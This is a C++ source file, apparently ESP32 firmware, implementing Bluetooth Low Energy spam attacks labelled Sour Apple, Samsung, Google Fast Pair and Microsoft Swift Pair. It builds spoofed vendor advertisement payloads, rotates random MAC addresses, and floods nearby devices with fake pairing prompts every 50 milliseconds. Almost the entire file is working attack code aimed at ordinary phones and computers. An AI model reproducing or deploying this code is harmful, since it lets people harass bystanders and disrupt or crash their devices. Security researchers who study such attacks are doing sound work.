#include "bluetooth_attacks.h"

// Global instance
BluetoothAttacks bleAttacks;

BluetoothAttacks::BluetoothAttacks() {
    _isRunning = false;
    _packetsSent = 0;
    _currentAttack = BLE_ATTACK_SOUR_APPLE;
    _lastSendTime = 0;
    _sendInterval = 50; // 50ms between packets
    _pAdvertising = nullptr;
    _rotateIndex = 0;
}

bool BluetoothAttacks::begin() {
    Serial.println("[BLE] Initializing Bluetooth...");
    
    try {
        NimBLEDevice::init("");
        NimBLEServer *pServer = NimBLEDevice::createServer();
        _pAdvertising = pServer->getAdvertising();
        
        Serial.println("[BLE] Bluetooth initialized successfully");
        return true;
    } catch (...) {
        Serial.println("[BLE] Failed to initialize Bluetooth");
        return false;
    }
}

void BluetoothAttacks::end() {
    if (_isRunning) {
        stop();
    }
    
    NimBLEDevice::deinit(true);
    _pAdvertising = nullptr;
    Serial.println("[BLE] Bluetooth deinitialized");
}

void BluetoothAttacks::stop() {
    if (_pAdvertising) {
        _pAdvertising->stop();
    }
    _isRunning = false;
    Serial.println("[BLE] Attack stopped. Packets sent: " + String(_packetsSent));
}

void BluetoothAttacks::startSourApple() {
    _currentAttack = BLE_ATTACK_SOUR_APPLE;
    _isRunning = true;
    _packetsSent = 0;
    Serial.println("[BLE] Starting Sour Apple Attack...");
}

void BluetoothAttacks::startSamsungSpam() {
    _currentAttack = BLE_ATTACK_SAMSUNG;
    _isRunning = true;
    _packetsSent = 0;
    Serial.println("[BLE] Starting Samsung Spam Attack...");
}

void BluetoothAttacks::startGoogleSpam() {
    _currentAttack = BLE_ATTACK_GOOGLE;
    _isRunning = true;
    _packetsSent = 0;
    Serial.println("[BLE] Starting Google Fast Pair Attack...");
}

void BluetoothAttacks::startMicrosoftSpam() {
    _currentAttack = BLE_ATTACK_MICROSOFT;
    _isRunning = true;
    _packetsSent = 0;
    Serial.println("[BLE] Starting Microsoft Swiftpair Attack...");
}

void BluetoothAttacks::startSpamAll() {
    _currentAttack = BLE_ATTACK_ALL;
    _isRunning = true;
    _packetsSent = 0;
    _rotateIndex = 0;
    Serial.println("[BLE] Starting ALL BLE Spam Attacks...");
}

void BluetoothAttacks::generateRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(0, 256);
    }
    // Set locally administered bit
    mac[0] |= 0x02;
    // Clear multicast bit
    mac[0] &= 0xFE;
}

void BluetoothAttacks::setBaseMacAddress(uint8_t* mac) {
    // Subtract 2 from last byte for ESP32 BT address offset
    if (mac[5] >= 2) {
        mac[5] -= 2;
    } else {
        mac[5] = 254;
        if (mac[4] > 0) mac[4]--;
    }
    
    #ifdef ESP_PLATFORM
        esp_base_mac_addr_set(mac);
    #endif
}

NimBLEAdvertisementData BluetoothAttacks::createApplePayload() {
    NimBLEAdvertisementData advData;
    uint8_t payload[17];
    int i = 0;
    
    // Random device type
    uint16_t deviceType = _appleDevices[random(0, 10)];
    
    payload[i++] = 17 - 1;           // Length
    payload[i++] = 0xFF;             // Manufacturer Specific Data
    payload[i++] = 0x4C;             // Apple Inc. Company ID
    payload[i++] = 0x00;
    payload[i++] = 0x0F;             // Proximity Pairing
    payload[i++] = 0x05;             // Length
    payload[i++] = 0xC1;             // Action Flags
    
    // Random action type
    const uint8_t actionTypes[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    payload[i++] = actionTypes[random(0, 11)];
    
    // Authentication Tag (random 3 bytes)
    esp_fill_random(&payload[i], 3);
    i += 3;
    
    payload[i++] = 0x00;             // Reserved
    payload[i++] = 0x00;             // Reserved
    payload[i++] = 0x10;             // Type
    
    // Device Type (2 bytes)
    payload[i++] = (deviceType >> 8) & 0xFF;
    payload[i++] = deviceType & 0xFF;
    
    // Random status byte
    payload[i++] = random(0, 256);
    
    advData.addData(std::string((char*)payload, 17));
    
    return advData;
}

NimBLEAdvertisementData BluetoothAttacks::createSamsungPayload() {
    NimBLEAdvertisementData advData;
    uint8_t payload[15];
    int i = 0;
    
    // Random watch model
    uint8_t model = _samsungWatches[random(0, 25)].value;
    
    payload[i++] = 14;               // Size
    payload[i++] = 0xFF;             // AD Type (Manufacturer Specific)
    payload[i++] = 0x75;             // Samsung Company ID (LSB)
    payload[i++] = 0x00;             // Samsung Company ID (MSB)
    payload[i++] = 0x01;
    payload[i++] = 0x00;
    payload[i++] = 0x02;
    payload[i++] = 0x00;
    payload[i++] = 0x01;
    payload[i++] = 0x01;
    payload[i++] = 0xFF;
    payload[i++] = 0x00;
    payload[i++] = 0x00;
    payload[i++] = 0x43;
    payload[i++] = model;            // Watch Model / Color
    
    advData.addData(std::string((char*)payload, 15));
    
    return advData;
}

NimBLEAdvertisementData BluetoothAttacks::createGooglePayload() {
    NimBLEAdvertisementData advData;
    uint8_t payload[14];
    int i = 0;
    
    payload[i++] = 3;                // Length
    payload[i++] = 0x03;             // Complete List of 16-bit Service UUIDs
    payload[i++] = 0x2C;             // Fast Pair Service UUID (LSB)
    payload[i++] = 0xFE;             // Fast Pair Service UUID (MSB)
    
    payload[i++] = 6;                // Length
    payload[i++] = 0x16;             // Service Data
    payload[i++] = 0x2C;             // Fast Pair Service UUID (LSB)
    payload[i++] = 0xFE;             // Fast Pair Service UUID (MSB)
    payload[i++] = 0x00;             // Model ID (random)
    payload[i++] = 0xB7;
    payload[i++] = 0x27;
    
    payload[i++] = 2;                // Length
    payload[i++] = 0x0A;             // TX Power Level
    payload[i++] = (rand() % 120) - 100; // -100 to +20 dBm
    
    advData.addData(std::string((char*)payload, 14));
    
    return advData;
}

NimBLEAdvertisementData BluetoothAttacks::createMicrosoftPayload() {
    NimBLEAdvertisementData advData;
    uint8_t payload[31];
    int i = 0;
    
    // Generate random 5-character name
    char name[6];
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int j = 0; j < 5; j++) {
        name[j] = charset[random(0, strlen(charset))];
    }
    name[5] = '\0';
    uint8_t nameLen = strlen(name);
    
    payload[i++] = nameLen + 1;     // Length
    payload[i++] = 0x09;            // Complete Local Name
    memcpy(&payload[i], name, nameLen);
    i += nameLen;
    
    advData.addData(std::string((char*)payload, 7 + nameLen));
    
    return advData;
}

void BluetoothAttacks::executeSourApple() {
    if (!_isRunning || !_pAdvertising) return;
    
    unsigned long currentTime = millis();
    if (currentTime - _lastSendTime < _sendInterval) return;
    
    _lastSendTime = currentTime;
    
    // Generate random MAC
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    setBaseMacAddress(macAddr);
    
    // Reinitialize with new MAC
    NimBLEDevice::deinit(true);
    delay(10);
    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    _pAdvertising = pServer->getAdvertising();
    
    // Create and send payload
    NimBLEAdvertisementData advData = createApplePayload();
    _pAdvertising->setAdvertisementData(advData);
    _pAdvertising->start();
    
    delay(20);
    
    _pAdvertising->stop();
    
    _packetsSent++;
    
    // Print every 10 packets
    if (_packetsSent % 10 == 0) {
        Serial.println("[BLE] Sour Apple packets sent: " + String(_packetsSent));
    }
}

void BluetoothAttacks::executeSamsungSpam() {
    if (!_isRunning || !_pAdvertising) return;
    
    unsigned long currentTime = millis();
    if (currentTime - _lastSendTime < _sendInterval) return;
    
    _lastSendTime = currentTime;
    
    // Generate random MAC
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    setBaseMacAddress(macAddr);
    
    // Reinitialize
    NimBLEDevice::deinit(true);
    delay(10);
    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    _pAdvertising = pServer->getAdvertising();
    
    // Create and send payload
    NimBLEAdvertisementData advData = createSamsungPayload();
    _pAdvertising->setAdvertisementData(advData);
    _pAdvertising->start();
    
    delay(20);
    
    _pAdvertising->stop();
    
    _packetsSent++;
    
    if (_packetsSent % 10 == 0) {
        Serial.println("[BLE] Samsung packets sent: " + String(_packetsSent));
    }
}

void BluetoothAttacks::executeGoogleSpam() {
    if (!_isRunning || !_pAdvertising) return;
    
    unsigned long currentTime = millis();
    if (currentTime - _lastSendTime < _sendInterval) return;
    
    _lastSendTime = currentTime;
    
    // Generate random MAC
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    setBaseMacAddress(macAddr);
    
    // Reinitialize
    NimBLEDevice::deinit(true);
    delay(10);
    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    _pAdvertising = pServer->getAdvertising();
    
    // Create and send payload
    NimBLEAdvertisementData advData = createGooglePayload();
    _pAdvertising->setAdvertisementData(advData);
    _pAdvertising->start();
    
    delay(20);
    
    _pAdvertising->stop();
    
    _packetsSent++;
    
    if (_packetsSent % 10 == 0) {
        Serial.println("[BLE] Google packets sent: " + String(_packetsSent));
    }
}

void BluetoothAttacks::executeMicrosoftSpam() {
    if (!_isRunning || !_pAdvertising) return;
    
    unsigned long currentTime = millis();
    if (currentTime - _lastSendTime < _sendInterval) return;
    
    _lastSendTime = currentTime;
    
    // Generate random MAC
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    setBaseMacAddress(macAddr);
    
    // Reinitialize
    NimBLEDevice::deinit(true);
    delay(10);
    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    _pAdvertising = pServer->getAdvertising();
    
    // Create and send payload
    NimBLEAdvertisementData advData = createMicrosoftPayload();
    _pAdvertising->setAdvertisementData(advData);
    _pAdvertising->start();
    
    delay(20);
    
    _pAdvertising->stop();
    
    _packetsSent++;
    
    if (_packetsSent % 10 == 0) {
        Serial.println("[BLE] Microsoft packets sent: " + String(_packetsSent));
    }
}

void BluetoothAttacks::executeRotateAll() {
    if (!_isRunning || !_pAdvertising) {
        return;
    }

    switch (_rotateIndex) {
        case 0:
            executeSourApple();
            break;
        case 1:
            executeSamsungSpam();
            break;
        case 2:
            executeGoogleSpam();
            break;
        default:
            executeMicrosoftSpam();
            break;
    }

    _rotateIndex = (_rotateIndex + 1) % 4;
}
